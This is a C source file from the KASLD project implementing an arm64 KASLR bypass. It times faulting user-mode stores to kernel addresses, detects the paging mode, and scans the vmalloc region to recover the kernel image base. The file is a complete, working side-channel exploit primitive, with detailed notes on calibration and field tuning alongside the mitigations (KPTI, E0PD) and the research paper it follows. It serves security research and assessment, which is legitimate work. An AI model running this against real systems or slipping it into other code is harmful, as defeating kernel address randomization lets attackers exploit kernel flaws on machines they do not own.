// This file is part of KASLD - https://github.com/bcoles/kasld
//
// arm64 kernel image base via fault-path timing.
//
// A store to a kernel address from EL0 always faults, but the fault costs
// measurably more when the address is mapped: the translation walk completes
// and raises a permission fault, where an unmapped address terminates the walk
// early with a translation fault at a higher level. Timing the faulting store
// therefore distinguishes mapped from unmapped kernel pages. The image is then
// the left edge of an image-sized mapped run inside the window the kernel
// places it in: VMALLOC_START equals KIMAGE_VADDR, so the lowest mapped address
// in the region belongs to whatever vmalloc allocated first, not to the image.
//
// The difference is a few hundred nanoseconds against a fault path costing
// microseconds, so each decision aggregates a run of faulting stores rather
// than relying on timer resolution: clock_gettime() is sufficient and no cycle
// counter is required. PMCCNTR_EL0 is normally inaccessible from EL0, which is
// what makes that property matter.
//
// Measured mapped-vs-unmapped separation, medians over 5000 iterations, stated
// as a fraction of the unmapped floor as the classifier measures it:
// Cortex-A72 3046 vs 2520 ns/iter (21%), Cortex-A53 4106 vs 3696 ns/iter (11%).
// Both parts time a MAPPED address SLOWER. The direction is not assumed: it is
// taken from a reference probe of the linear map, whose mapped status is not in
// question.
//
// Technique by Milad Seddigh, Mahdi Esfahani, Sarani Bhattacharya, Mohammad
// Reza Aref and Hadi Soleimany: "Breaking KASLR on Mobile Devices without Any
// Use of Cache Memory" (ASHES 2022). The paper attributes the difference to a
// permission-faulting entry being retained in the TLB and reports the opposite
// timing direction; the classification is unaffected, since the reference probe
// supplies the sign.
//
// Leak primitive:
//   Data leaked:      kernel image base (_text)
//   Kernel subsystem: arch/arm64 — MMU fault-path timing
//   Data structure:   kernel image mapping (translation vs permission fault)
//   Address type:     virtual (kernel image base)
//   Method:           timing (faulting-store latency, aggregated)
//   Status:           unfixed where the kernel mapping is reachable from EL0
//   Access check:     N/A (hardware side-channel — no kernel gate)
//   Source:           N/A (hardware side-channel)
//
// Mitigations:
//   KPTI (CONFIG_UNMAP_KERNEL_AT_EL0) removes kernel translation tables from
//   the EL0 page tables, so no kernel table is walked and mapped and unmapped
//   addresses fault identically. arm64 forces KPTI on whenever KASLR is
//   enabled — kaslr_requires_kpti() — unless the CPU implements E0PD, which
//   blocks EL0 access to kernel addresses without a walk for the same purpose.
//   The technique therefore applies only where the kernel mapping is still
//   reachable from EL0: an explicit kpti=off, or a build without
//   CONFIG_UNMAP_KERNEL_AT_EL0. Measured inert on a Cortex-A72 with KPTI
//   active, and live on the same part and kernel with kpti=off.
//
// Debugging:
//   -v / KASLD_VERBOSE      the calibration table, the edge walk and the
//                           confirmation steps -- about a page of output.
//   KASLD_ARM64_TLB_DEBUG=1 every probed slot with its measured time, which on
//                           a VA_BITS=39 window is six figures of lines.
//
// References:
//   https://dl.acm.org/doi/10.1145/3560834.3563823
//   https://link.springer.com/article/10.1007/s13389-023-00344-y
//   https://github.com/millad7/KASARM
//
// Built at the default -O2, unlike the x86 side-channel components. Those need
// -O0 because they time instruction sequences a few cycles wide, where the
// optimizer reordering a load around an rdtsc or eliding a volatile probe
// destroys the measurement. Nothing here is that delicate: the quantity is a
// microsecond-scale fault path, and it is bracketed by clock_gettime() calls
// the compiler must treat as opaque, so the faulting store cannot migrate out
// from between them. Keeping the optimizer also keeps _FORTIFY_SOURCE, which
// the -O0 components lose -- and which is the runtime check for exactly the
// kind of hand-rolled buffer arithmetic this file does.
// ---
// <bcoles@gmail.com>

#if !defined(__aarch64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/cmdline.h"
#include "include/dmesg.h"
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/kasld/kaslr_default.h"
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

KASLD_EXPLAIN(
    "arm64 fault-path timing (Seddigh et al., 2022): a store to a kernel "
    "address from user mode faults either way, but costs measurably more when "
    "the address is mapped, because the translation walk completes before the "
    "permission fault. Timing faulting stores across candidate addresses "
    "locates the lowest mapped address in the vmalloc region, which is the "
    "kernel image base. Mitigated by KPTI, which arm64 forces on whenever "
    "KASLR is enabled, and by E0PD on ARMv8.5 and later.");

KASLD_META("method:timing\n"
           "phase:probing\n"
           "live:1\n"
           "discloses:virtual\n"
           "hardware:MMU fault-path timing (mitigated by KPTI / E0PD)\n");

/* Faulting stores per timed decision. The separation runs 10-24% of the fault
 * cost across the two parts measured, so a short run resolves it; the paper
 * needed thousands of iterations because the difference it reports is smaller
 * than that by more than an order of magnitude. */
#define ITERS_SCAN 12
#define ITERS_CONFIRM 400

/* The seed contributes the image offset at MIN_KIMG_ALIGN (2 MiB) granularity
 * and the physical placement supplies the bits below it, so a 2 MiB grid finds
 * the image and a KASLR_VIRT_ALIGN grid then pins its base. */
#define SCAN_STEP 0x200000ul
#define FINE_STEP ((unsigned long)KASLR_VIRT_ALIGN)

/* Consecutive mapped slots required to accept a run as the image rather than a
 * timing outlier, and the unmapped slots tolerated inside it: both boards show
 * holes within the mapped region (4 MiB on the A53, 6 MiB on the A72) and an
 * isolated elevated slot outside it. */
#define RUN_LEN 4
#define HOLE_TOLERANCE 4

/* A confirmed run is only the image if it is image-sized. VMALLOC_START equals
 * KIMAGE_VADDR, so the scan begins inside the region vmalloc allocates from and
 * the first mapped thing it meets is often an unrelated allocation -- on one
 * board KIMAGE_VADDR itself was reported as the base twice for exactly this
 * reason. Measuring how far the run extends separates a kernel image from its
 * neighbours: the images observed span 18-26 MiB, and the bounds below are set
 * wide enough to cover a debug build without admitting a stray mapping or the
 * module region. */
#define EXTENT_MIN_MB 8
#define EXTENT_MAX_MB 96

/* Calibration attempts before the run is abandoned. Each costs a few tens of
 * milliseconds and each must clear the same tests independently, so retrying
 * declines to give up on one noisy draw without relaxing the gate. */
#define CALIBRATE_TRIES 4

/* Reached only where the oracle has already proved itself, so the budget bounds
 * a scan expected to succeed rather than a speculative one. A VA_BITS=39 window
 * is ~97k slots and finishes in seconds; wider paging modes exhaust this and
 * say so, and -t raises it. */
#define DEFAULT_BUDGET_S 30

/* Per-slot firehose. -v carries the calibration table and the edge walk, which
 * is a page of output; this dumps every probed slot, which on a VA_BITS=39
 * window is six figures of lines. Separate knob, as in the other side-channel
 * components. */
static int debug_mode;

/* Set once a tagged line has been written. A disposition explains the absence
 * of a result, so a run that already published one must not emit a disposition
 * when a later stage gives up -- the two channels would contradict. */
static int emitted;

static sigjmp_buf jb;

/* sig_atomic_t because a signal handler writes it: that is the only integer
 * type the language promises can be accessed from one. The count is a
 * diagnostic, and an int holds three orders of magnitude more than the ~9e5 a
 * full sweep issues. */
static volatile sig_atomic_t fault_count;

static int note_match(const char *line, void *ctx) {
  (void)line;
  *(int *)ctx = 1;
  return 0; /* one match settles it */
}

/* KPTI is not reported through /sys on arm64 -- the meltdown file reads "Not
 * affected" on a part whose KPTI is forced on by KASLR -- so the kernel log is
 * the only unprivileged statement of it. Absence is not evidence: the ring
 * buffer wraps, and the log may be unreadable. */
static int kpti_confirmed(void) {
  int seen = 0;
  dmesg_search("Kernel page table isolation", note_match, &seen);
  return seen;
}

static void on_fault(int sig) {
  (void)sig;
  fault_count++;
  siglongjmp(jb, 1);
}

/* sidechannel.h's pin_cpu() is x86_64-only (it pulls in cpuid.h), so the
 * affinity call is made directly. Pinning matters because the measurement is a
 * minimum over a run of faults: a migration mid-run lets a second core's floor
 * set the result for the first. */
static void pin_first_cpu(void) {
  cpu_set_t set;

  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(0, sizeof(set), &set) != 0)
    kasld_debug("could not pin to a core; samples will be noisier");
}

static double now_ns(void) {
  struct timespec t;
  clock_gettime(CLOCK_MONOTONIC, &t);
  return (double)t.tv_sec * 1e9 + (double)t.tv_nsec;
}

/* Cost of the cheapest of `iters` faulting stores to `addr`.
 *
 * The minimum, not the mean. The fault path has a floor and every source of
 * noise on this machine -- preemption, interrupts, a migration -- only adds to
 * it, so the minimum converges on the property being measured while the mean
 * tracks whatever else the box was doing. Timing each fault separately costs
 * two clock reads against a microsecond of fault, and buys a decision that a
 * single scheduling hiccup cannot flip.
 *
 * sigsetjmp's savemask argument must be non-zero: siglongjmp out of the handler
 * has to restore the signal mask, or SIGSEGV stays blocked after the first
 * fault and the second store kills the process. */
static double probe(unsigned long addr, int iters) {
  volatile unsigned char *p = (volatile unsigned char *)addr;
  /* Volatile as insurance, not as a fix for a present defect. C99 7.13.2.1
   * makes an automatic local indeterminate after a longjmp only when it is
   * modified BETWEEN the setjmp and that longjmp; here both are written after
   * control has already returned, and the next iteration establishes a fresh
   * setjmp, so the rule is not engaged as the loop stands. It is one memory
   * round-trip per iteration, outside the timed region, and it keeps the
   * accumulator correct if anything is ever moved inside the guarded block --
   * where the rule would engage and the failure would be a wrong measurement
   * rather than a crash. */
  volatile double best = 0.0;
  volatile int i;

  for (i = 0; i < iters; i++) {
    double t0 = now_ns(), t1;

    if (sigsetjmp(jb, 1) == 0) {
      *p = 'k';
      (void)(*p + 1);
    }
    t1 = now_ns();
    if (i == 0 || t1 - t0 < best)
      best = t1 - t0;
  }
  return best;
}

/* Rolling-baseline window, and the largest sample count median_of() accepts.
 * The two are tied together deliberately: sizing the scratch buffer to the
 * ring's own width is what stops the two drifting apart. */
#define RING 64

static double median_of(const double *v, size_t n) {
  double t[RING];
  size_t i, j;

  /* The scratch buffer is sized to RING because the rolling baseline is the
   * widest caller, and the clamp holds that true for any other. Overrunning it
   * writes past the return address, and a component doing its own buffer
   * arithmetic should not depend on the build to notice. */
  if (n > RING)
    n = RING;
  memcpy(t, v, n * sizeof(double));
  for (i = 0; i < n; i++)
    for (j = i + 1; j < n; j++)
      if (t[j] < t[i]) {
        double s = t[i];
        t[i] = t[j];
        t[j] = s;
      }
  return t[n / 2];
}

/* Classification is a direction and a relative margin, both learned at runtime,
 * applied against a LOCAL baseline rather than a fixed threshold.
 *
 * A fixed threshold does not survive this scan. The measured floor moves by
 * more than a factor of two as cpufreq ramps -- 2570 ns/iter at one moment and
 * 5828 at another on the same board -- so a threshold learned during
 * calibration misclassifies everything once the governor changes its mind
 * mid-sweep. The gap between mapped and unmapped is a stable FRACTION of the
 * floor -- 18-24% on the A72 and 10-13% on the A53, each steady while its own
 * absolute times triple -- so the comparison is made against a running median
 * of recent unmapped slots and scaled to it. */
static double g_gap_ratio;
static int g_mapped_is_slower;

static double ring[RING];
static int ring_n, ring_pos;

static void ring_push(double v) {
  ring[ring_pos] = v;
  ring_pos = (ring_pos + 1) % RING;
  if (ring_n < RING)
    ring_n++;
}

/* A mapped slot sits in a BAND above the floor, not merely above it.
 *
 * The gap is a stable fraction of the floor, so a sample several times further
 * out than that fraction is not a mapping but the governor changing the clock:
 * one field run read
 * 4703 ns against a 2611 ns floor -- 80% -- and, because only unmapped samples
 * were feeding the floor, every subsequent slot then read "mapped" too. The
 * floor could never catch up, and the run grew to 74 MiB before the size test
 * rejected it. Bounding the band above breaks that feedback: an excursion
 * beyond it is treated as a floor shift and folded into the baseline instead.
 */
#define BAND_LO 0.5
#define BAND_HI 3.0

enum slot_class { SLOT_UNMAPPED, SLOT_MAPPED, SLOT_OUTLIER };

static enum slot_class classify(double t, double baseline) {
  double d = g_mapped_is_slower ? t - baseline : baseline - t;
  double gap = g_gap_ratio * baseline;

  if (d < BAND_LO * gap)
    return SLOT_UNMAPPED;
  if (d > BAND_HI * gap)
    return SLOT_OUTLIER;
  return SLOT_MAPPED;
}

static double ring_baseline(double fallback) {
  if (ring_n < 8)
    return fallback;
  /* median_of() takes a const pointer and sorts its own copy, so the live ring
   * is handed over directly. */
  return median_of(ring, (size_t)ring_n);
}

static int is_mapped_at(unsigned long addr, int iters, double baseline,
                        double *out) {
  double t = probe(addr, iters);

  if (out)
    *out = t;
  return classify(t, baseline) == SLOT_MAPPED;
}

/* Give up after a tagged line has already been written: report the reason on
 * stderr but leave the exit code at 0, because a result was produced. */
static int give_up(const char *msg) {
  if (emitted) {
    kasld_info("%s", msg);
    return 0;
  }
  return kasld_disp_inconclusive(msg);
}

/* Locate VA_BITS by finding which candidate linear map is backed.
 *
 * PAGE_OFFSET is -(1 << VA_BITS), and the linear map covers physical memory, so
 * the candidate matching this kernel is backed. That identifies the paging mode
 * AND supplies the mapped reference sample, without needing any address whose
 * status has to be assumed. Probing a little way into the map avoids depending
 * on the first page being present, since memstart_addr can displace the start
 * of the mapping.
 *
 * A second candidate can also be backed: on a VA_BITS=48 kernel the 47-bit
 * candidate lands on _PAGE_END(48), which is MODULES_VADDR, and a loaded module
 * may occupy the offsets probed there. The tests below settle it rather than
 * the bare fact of being mapped -- the linear map is backed at every offset
 * probed, where a module region is backed only where something was loaded.
 *
 * Picking the largest outlier and then asking whether it is large is circular:
 * over six noisy samples the extreme one always looks notable. So the candidate
 * has to clear the spread of the others (a MAD multiple, which a single wild
 * sample cannot inflate), and has to deviate the same way at every offset
 * probed. Noise moves independently at each; a mapping does not. */
#define VA_ROUNDS 5
#define VA_MAD_MULTIPLE 6.0

static unsigned long detect_va_bits(double *mapped_ref, double *unmapped_ref) {
  static const unsigned long cand[] = VA_BITS_CANDIDATES;
  static const unsigned long off[VA_ROUNDS] = {
      64ul << 20, 128ul << 20, 192ul << 20, 96ul << 20, 160ul << 20};
  size_t n = sizeof(cand) / sizeof(cand[0]), i, r, best_i = 0;
  double per[16][VA_ROUNDS], ratio[16][VA_ROUNDS], row_med[VA_ROUNDS];
  double med[16], dev[16];
  double all_med, mad, best = 0.0;
  int slower;

  /* Round-robin across candidates, not candidate-by-candidate. cpufreq moves
   * the floor by a factor of three on these boards, and a sweep that finishes
   * one candidate before starting the next attributes that drift to the
   * candidate. Interleaving exposes every candidate to the same drift within a
   * round; taking the per-candidate median across rounds then discards the
   * rounds the governor spoiled. Without this a high-clock moment reads as a
   * "mapped" candidate -- observed picking VA_BITS=52 with the direction
   * inverted and a 68% "separation". */
  for (r = 0; r < VA_ROUNDS; r++)
    for (i = 0; i < n; i++) {
      unsigned long po = ~0ul - (1ul << cand[i]) + 1ul;
      per[i][r] = probe(po + off[r], ITERS_CONFIRM);
    }

  /* Normalise each round against its own median before comparing candidates.
   *
   * Interleaving equalises drift within a round but not across them. A
   * calibration pass takes tens of milliseconds and the governor moves the
   * floor by a factor of three on these boards, so a per-candidate median taken
   * ACROSS rounds averages samples from
   * different clock speeds and the spread between unmapped candidates swamps
   * the 10-12% a mapping is worth. Dividing each sample by the median of its
   * own round removes the clock entirely: within a round every candidate sees
   * the same one, so an unmapped candidate reads ~1.00 whatever the frequency
   * and a mapped one reads ~1.10-1.20. The test below then compares pure
   * ratios. This is the same frequency-invariance the scan classifier already
   * relies on, applied one stage earlier. */
  for (r = 0; r < VA_ROUNDS; r++) {
    double row[16];

    for (i = 0; i < n; i++)
      row[i] = per[i][r];
    row_med[r] = median_of(row, n);
    if (row_med[r] <= 0.0)
      return 0;
    for (i = 0; i < n; i++)
      ratio[i][r] = per[i][r] / row_med[r];
  }

  for (i = 0; i < n; i++) {
    med[i] = median_of(ratio[i], VA_ROUNDS);
    kasld_debug("VA_BITS=%2lu: %.1f/%.1f/%.1f/%.1f/%.1f ns -> ratio %.4f",
                cand[i], per[i][0], per[i][1], per[i][2], per[i][3], per[i][4],
                med[i]);
  }

  all_med = median_of(med, n);
  for (i = 0; i < n; i++)
    dev[i] = med[i] > all_med ? med[i] - all_med : all_med - med[i];
  mad = median_of(dev, n);

  for (i = 0; i < n; i++)
    if (dev[i] > best) {
      best = dev[i];
      best_i = i;
    }

  if (mad <= 0.0 || best < VA_MAD_MULTIPLE * mad) {
    kasld_debug("no candidate stands out: best deviation %.1f ns against "
                "MAD %.1f",
                best, mad);
    return 0;
  }

  /* Every round of the winner must land on the same side of the majority. */
  slower = med[best_i] > all_med;
  for (r = 0; r < VA_ROUNDS; r++)
    if ((ratio[best_i][r] > all_med) != slower) {
      kasld_debug("candidate VA_BITS=%lu is inconsistent across rounds",
                  cand[best_i]);
      return 0;
    }

  /* Both measured parts fault SLOWER on a mapped address: the walk completes
   * before the permission fault, where an unmapped address terminates early.
   * A faster outlier is therefore a clock artefact, not a mapping, and is the
   * exact shape the interleaving above is meant to catch. Refusing it costs
   * nothing on hardware that behaves as observed and rejects the failure that
   * was seen in the field. */
  if (!slower) {
    kasld_debug("outlier candidate reads faster than the majority: "
                "a frequency artefact, not a mapping");
    return 0;
  }

  /* Hand back absolute times from the latest round, not ratios: the scan needs
   * a floor in nanoseconds to seed its rolling baseline, and the most recent
   * round is the one closest to the clock the scan will start at. */
  *mapped_ref = per[best_i][VA_ROUNDS - 1];
  *unmapped_ref = row_med[VA_ROUNDS - 1];
  return cand[best_i];
}

int main(int argc, char **argv) {
  unsigned long va_bits, va_bits_min, page_end, vmalloc_start;
  unsigned long scan_start, span, top;
  unsigned long addr, edge = 0, base, extent_mb = 0;
  double mapped_ref, unmapped_ref, sep, budget, started, now;
  double last_report;
  unsigned long long slots, scanned = 0;
  int run = 0, holes = 0, attempt;

  int budget_ms = kasld_cli_timed(argc, argv, DEFAULT_BUDGET_S * 1000);
  if (kasld_skip_live_probe("arm64_tlb_fault_timing"))
    return 0;

  debug_mode = getenv("KASLD_ARM64_TLB_DEBUG") != NULL;

  /* Nothing to search for when the base is not randomized -- checked FIRST.
   *
   * arch/arm64/kernel/pi/kaslr_early.c leaves the image at KIMAGE_VADDR on
   * three paths: a nokaslr command line, CONFIG_RANDOMIZE_BASE=n, or no seed
   * from either the FDT or RNDR. Two are cheap to observe and are checked here;
   * the third would need the kernel config and does not need to be.
   *
   * Ordered ahead of calibration deliberately. These are deterministic fact
   * reads costing microseconds, where calibration is a timing measurement that
   * can decline under load -- so running it first made a board whose KASLR is
   * off report "no mapped/unmapped timing difference" whenever the measurement
   * happened to be noisy, which is both wrong and unstable. A cheap certain
   * answer belongs in front of an expensive uncertain one.
   *
   * The cost is that SF_VIRT_ADDR_BITS is not published on such a system. That
   * is the right trade: mmap_arm64_va_bits states the same fact at a higher
   * confidence without a side-channel, where a flapping disposition has no
   * second source.
   *
   * This is a fast path, not a correctness gate. Missing a way for KASLR to be
   * off costs a scan that finds nothing and declines -- wasteful, never wrong
   * -- so a future kernel growing a fourth path degrades runtime, not the
   * answer.
   *
   * The seed test is kasld_kaslr_disabled_text_default() rather than an
   * open-coded one, so the arch's notion of "no seed" lives in one place: it
   * declines to assert under EFI (the stub's seed path is not confirmed visible
   * in the FDT) and on an ACPI boot with no device tree, and it reads the RNDR
   * hwcap through the sysroot layer instead of this process's own auxv. */
  if (cmdline_has_word("nokaslr")) {
    kasld_err("nokaslr on the kernel command line: the image is at the "
              "compile-time base, which needs no side-channel");
    return kasld_disp_absent("KASLR disabled by the kernel command line");
  }
  if (kasld_kaslr_disabled_text_default() != 0) {
    kasld_err("no FDT kaslr-seed and no RNDR: the image is at the "
              "compile-time base, which needs no side-channel");
    return kasld_disp_absent("KASLR is not active on this kernel");
  }

  signal(SIGSEGV, on_fault);
  signal(SIGBUS, on_fault);
  pin_first_cpu();

  /* Calibration is a handful of milliseconds and its gate is deliberately
   * strict, so a single noisy draw should not end the run. Each attempt has to
   * clear the same MAD, consistency and direction tests independently -- this
   * retries the measurement, it does not relax the threshold. */
  for (attempt = 0; attempt < CALIBRATE_TRIES; attempt++) {
    va_bits = detect_va_bits(&mapped_ref, &unmapped_ref);
    if (va_bits)
      break;
    kasld_debug("calibration attempt %d/%d found no distinguishable candidate",
                attempt + 1, CALIBRATE_TRIES);
  }
  if (!va_bits) {
    kasld_err("no candidate linear map is distinguishable from the rest: "
              "the fault path does not leak mapped/unmapped state here");
    if (kpti_confirmed())
      return kasld_disp_mitigation("kpti", "KPTI active: kernel tables are not "
                                           "mapped at EL0");
    return kasld_disp_inconclusive(
        "no mapped/unmapped timing difference (KPTI, E0PD, or a part that "
        "does not leak the fault path)");
  }
  sep = mapped_ref > unmapped_ref ? mapped_ref - unmapped_ref
                                  : unmapped_ref - mapped_ref;

  kasld_info("linear map %.1f ns/iter, unmapped %.1f ns/iter (%.1f%% apart)",
             mapped_ref, unmapped_ref, 100.0 * sep / unmapped_ref);

  /* Require the oracle to prove itself before any address is believed. Below
   * this the classification would be noise, and a threshold drawn through
   * noise reports a base with the same confidence as a real one. 3% is well
   * under the 10% seen on the weaker of the two parts measured and well above
   * the ~1% slot-to-slot scatter. */
  if (sep < 0.03 * unmapped_ref) {
    kasld_err("mapped and unmapped kernel addresses time alike "
              "(%.1f vs %.1f ns/iter): no usable signal",
              mapped_ref, unmapped_ref);
    if (kpti_confirmed())
      return kasld_disp_mitigation("kpti", "KPTI active: kernel tables are not "
                                           "mapped at EL0");
    return kasld_disp_inconclusive(
        "no mapped/unmapped timing difference (KPTI, E0PD, or a part that "
        "does not leak the fault path)");
  }

  g_mapped_is_slower = mapped_ref > unmapped_ref;
  g_gap_ratio = sep / unmapped_ref;
  kasld_info("VA_BITS=%lu; mapped reads %s, gap %.1f%% of the floor", va_bits,
             g_mapped_is_slower ? "slower" : "faster", 100.0 * g_gap_ratio);

  /* The paging mode is a result in its own right, and it is settled before the
   * scan that may not be: which candidate linear map is backed identifies
   * VA_BITS, and PAGE_OFFSET follows from it. Published at CONF_TIMING because
   * it rests on the same measurement everything else here does -- the
   * mmap-probe component states the same fact at CONF_INFERRED, and the
   * strongest-wins resolver keeps that one where both run. */
  kasld_emit_scalar(SF_VIRT_ADDR_BITS, va_bits, CONF_TIMING);
  emitted = 1;

  /* Start at KIMAGE_VADDR, not at PAGE_END.
   *
   * arch/arm64/include/asm/memory.h: MODULES_VADDR = _PAGE_END(VA_BITS_MIN),
   * MODULES_VSIZE = SZ_2G, KIMAGE_VADDR = MODULES_END = MODULES_VADDR + 2 GiB.
   * The two gigabytes below KIMAGE_VADDR are the module region, which is mapped
   * wherever a module is loaded -- so a scan beginning at PAGE_END finds module
   * text long before it finds the image and reports a module address as the
   * base. That is what the first field runs did.
   *
   * VMALLOC_START equals KIMAGE_VADDR, so the image shares its region with
   * vmalloc; "lowest mapped address" is not the base by itself, and a candidate
   * has to be confirmed rather than trusted. */
  va_bits_min = va_bits > 48 ? 48 : va_bits;
  page_end = ~0ul - (1ul << (va_bits_min - 1)) + 1ul;
  vmalloc_start = page_end + 0x80000000ul; /* + MODULES_VSIZE = KIMAGE_VADDR */

  /* Scan the middle of the vmalloc area, not all of it.
   *
   * arch/arm64/kernel/pi/kaslr_early.c places the image deliberately:
   *
   *   range = (VMALLOC_END - KIMAGE_VADDR) / 2;
   *   return range / 2 + (((__uint128_t)range * seed) >> 64);
   *
   * so the displacement is uniform over [range/2, 3*range/2] -- the middle half
   * of the area, staying clear of the quarters at either end. Everything below
   * that is where early vmalloc allocations live, and on both boards tested
   * they form a 52-62 MiB mapped block starting at VMALLOC_START itself, which
   * is image-sized and would be reported as the base. The kernel's own rule
   * excludes it.
   *
   * VMALLOC_END needs sizeof(struct page) and PAGE_SHIFT to compute exactly, so
   * the span is approximated up to VMEMMAP_END (-SZ_1G, an exact constant).
   * That overestimates it by the vmemmap, which widens the window rather than
   * narrowing it: an eighth-to-seven-eighths cut of the overestimate still sits
   * outside the quarter-to-three-quarters the kernel guarantees. Verified
   * against the measured board: a 171.5 GiB displacement inside a [31.6, 221.4]
   * GiB window.
   *
   * A kernel with KASLR off puts the image at KIMAGE_VADDR, below this window.
   * That case is not this component's to answer: the base is the compile-time
   * default and arm64_no_seed states it without a side-channel. */
  span = (~0ul - 0x40000000ul + 1ul) - vmalloc_start; /* VMEMMAP_END - start */
  scan_start = vmalloc_start + span / 8;
  top = vmalloc_start + span - span / 8;
  slots = ((unsigned long long)(top - scan_start)) / SCAN_STEP;

  budget = budget_ms / 1000.0;
  kasld_info("scanning %llu slots of %lu MiB from 0x%016lx, budget %.0fs",
             slots, SCAN_STEP >> 20, scan_start, budget);

  started = now_ns();
  last_report = started;
  for (addr = scan_start; addr < top; addr += SCAN_STEP) {
    double t, baseline = ring_baseline(unmapped_ref);
    enum slot_class cls;
    int mapped;

    t = probe(addr, ITERS_SCAN);
    cls = classify(t, baseline);
    mapped = cls == SLOT_MAPPED;

    if (debug_mode)
      kasld_info("slot 0x%016lx %8.1f ns (floor %8.1f) %s", addr, t, baseline,
                 cls == SLOT_MAPPED    ? "mapped"
                 : cls == SLOT_OUTLIER ? "outlier"
                                       : "-");

    if (!mapped) {
      ring_push(t); /* unmapped samples and clock excursions both define it */
      if (run > 0 && holes < HOLE_TOLERANCE)
        holes++;
      else
        run = 0, holes = 0, edge = 0;
    } else {
      if (run == 0)
        edge = addr;
      run++;
      holes = 0;
    }

    /* A candidate run is re-measured at full precision before it is believed,
     * and a rejected one does not end the scan: the sweep continues from the
     * next slot. Aborting on the first candidate is why a single spurious slot
     * ended a whole run in the field. */
    if (run >= RUN_LEN) {
      unsigned long a;
      int good = 0;

      for (a = edge; a < edge + (unsigned long)RUN_LEN * SCAN_STEP;
           a += SCAN_STEP)
        if (is_mapped_at(a, ITERS_CONFIRM, ring_baseline(unmapped_ref), NULL))
          good++;

      if (good >= RUN_LEN - 1) {
        unsigned long end = edge;
        int gap = 0;

        /* Walk to the far side of the run to size it, but no further than a
         * plausible image: unbounded, this walks a large mapped region for
         * minutes with no budget check, which is what hung a field run. */
        for (a = edge; a < top && a < edge + ((EXTENT_MAX_MB + 8) << 20);
             a += SCAN_STEP) {
          if (is_mapped_at(a, ITERS_SCAN, ring_baseline(unmapped_ref), NULL)) {
            end = a;
            gap = 0;
          } else if (++gap > HOLE_TOLERANCE) {
            break;
          }
        }
        extent_mb = (end + SCAN_STEP - edge) >> 20;
        if (extent_mb >= EXTENT_MIN_MB && extent_mb <= EXTENT_MAX_MB) {
          kasld_info("mapped run confirmed at 0x%016lx, %lu MiB, after "
                     "%llu probes",
                     edge, extent_mb, scanned);
          break;
        }
        kasld_debug("run at 0x%016lx spans %lu MiB: not an image", edge,
                    extent_mb);
        /* Resume beyond the rejected region -- but only ever forward. `end` is
         * measured from `edge`, which sits at or below the slot the loop has
         * reached, so assigning it unconditionally can move the cursor
         * BACKWARDS; the run is then re-detected, re-confirmed and re-rejected
         * at the same address forever. That is the loop that hung both boards.
         */
        if (end > addr)
          addr = end;
      } else {
        kasld_debug("candidate at 0x%016lx failed confirmation (%d/%d)", edge,
                    good, RUN_LEN);
      }
      run = 0;
      holes = 0;
      edge = 0;
    }

    /* Checked every slot, not every 1024: a candidate confirmation costs
     * RUN_LEN * ITERS_CONFIRM faults, so a run of them can overshoot a
     * coarse-grained check by a wide margin. */
    ++scanned;

    /* Progress, so a long scan is distinguishable from a stuck one. A probing
     * component that prints nothing for half a minute is indistinguishable
     * from a hang, and the difference matters to whoever is watching it. */
    now = now_ns();
    if (now - last_report > 2e9) {
      last_report = now;
      kasld_debug("%llu/%llu slots, %.1fs elapsed, at 0x%016lx, %lu faults",
                  scanned, slots, (now - started) / 1e9, addr,
                  (unsigned long)fault_count);
    }

    /* A second backstop that does not depend on the clock. If the cursor ever
     * stops advancing, the time budget still fires -- but a bounded probe count
     * fails loudly rather than spinning, and costs one comparison. */
    if (scanned > slots + 16) {
      kasld_err("probe count exceeded the slot count: the scan is not "
                "advancing");
      return give_up("scan did not advance");
    }

    if ((now - started) / 1e9 > budget) {
      kasld_err("budget exhausted after %llu of %llu slots "
                "(%.1f%% of the window); raise it with -t",
                scanned, slots, 100.0 * (double)scanned / (double)slots);
      return give_up("scan budget exhausted before the image was found");
    }
  }

  if (!edge || run < RUN_LEN)
    return give_up("no confirmed mapped region in the scan window");

  /* Walk back down while slots keep reading mapped, so a hole at the head of
   * the image cannot leave the accepted run above the true edge. */
  for (addr = edge - SCAN_STEP, holes = 0; addr >= scan_start;
       addr -= SCAN_STEP) {
    if (is_mapped_at(addr, ITERS_CONFIRM, ring_baseline(unmapped_ref), NULL)) {
      edge = addr;
      holes = 0;
      continue;
    }
    if (++holes > HOLE_TOLERANCE)
      break;
  }
  kasld_debug("left edge after descent: 0x%016lx", edge);

  if (edge <= scan_start) {
    kasld_err("the mapped region runs to the bottom of the scan window");
    return give_up("no left edge within the scan window");
  }

  /* The 2 MiB grid brackets the base; the KASLR grid pins it. The kernel maps
   * from _text upward and nothing below it, so the lowest mapped address IS
   * the image base. */
  base = edge;
  for (addr = edge - FINE_STEP; addr > edge - SCAN_STEP && addr > scan_start;
       addr -= FINE_STEP) {
    if (!is_mapped_at(addr, ITERS_CONFIRM, ring_baseline(unmapped_ref), NULL))
      break;
    base = addr;
    kasld_debug("fine step: 0x%016lx still mapped", addr);
  }

  if (!is_mapped_at(base, ITERS_CONFIRM, ring_baseline(unmapped_ref), NULL) ||
      is_mapped_at(base - FINE_STEP, ITERS_CONFIRM, ring_baseline(unmapped_ref),
                   NULL)) {
    kasld_err("edge at 0x%016lx did not confirm on re-measurement", base);
    return give_up("edge unstable on confirmation; a quieter run may resolve "
                   "it");
  }

  if (base < KERNEL_VIRT_TEXT_MIN || base > KERNEL_VIRT_TEXT_MAX)
    return give_up("candidate outside the text window");

  kasld_info("faulting stores issued: %lu", (unsigned long)fault_count);
  kasld_found("kernel image base (_text): 0x%016lx", base);
  kasld_result_base(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, base, "_text",
                    CONF_TIMING);
  return 0;
}
